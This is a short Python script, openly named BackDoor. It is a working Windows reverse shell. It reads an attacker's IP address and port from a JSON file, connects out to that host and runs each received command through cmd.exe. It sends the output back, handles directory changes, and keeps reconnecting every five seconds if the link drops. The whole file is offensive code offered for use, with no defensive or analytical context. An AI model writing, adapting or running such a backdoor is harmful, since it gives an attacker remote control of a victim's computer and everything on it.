import socket, os, sys, pickle, json
import subprocess as sp
from time import sleep

class BackDoor:
    def __init__(self):
        pass
    def conn(self):
        args = get_arguments()
        while True:
            try:
                s = socket.socket()
                s.connect((args["server_ip"], args["server_port"]))
                while True:
                    command = s.recv(4096).decode(encoding="latin1")
                    if command == ("exit"):
                        s.close()
                        sys.exit()
                    if len(command) > 2 and len(command[3:]) > 0:
                        if os.path.exists(command[3:]) and os.path.isdir(command[3:]):
                            os.chdir(command[3:])
                    run = sp.run(["cmd.exe", "/C", command], capture_output=True, shell=True,
                    text=True, universal_newlines=True).stdout
                    output_length = len(run)
                    s.send(pickle.dumps(output_length))
                    run = run.encode(encoding="latin1")
                    s.send(run)
            except  Exception  as e:
                s.close()
                sleep(5)
def get_arguments():
    with open("PRMTR.json", "r+") as file:
        args = json.load(file)
        return args

if __name__ == ("__main__"):
    backdoor = BackDoor()
    backdoor.conn()
        
